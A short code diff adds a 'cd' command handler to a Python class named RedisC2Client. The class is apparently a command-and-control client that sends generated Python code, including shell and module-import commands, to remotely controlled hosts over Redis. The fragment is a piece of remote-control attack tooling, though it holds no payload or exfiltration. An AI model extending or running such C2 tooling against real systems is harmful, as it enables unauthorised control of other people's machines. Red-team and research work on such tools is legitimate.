@@ -82,6 +82,12 @@ class RedisC2Client:
         [mod] = args
         return f"globals().update({{{mod!r}:__import__({mod!r})}})"
 
+    def handle_cd(self, args):
+        if len(args) != 1:
+            return print("usage: cd DIR")
+        self._requires("os")
+        return f"os.chdir({args[0]!r})"
+
     def handle_ls(self, args):
         return self.handle_sh(["ls", "-x"] + args)
 
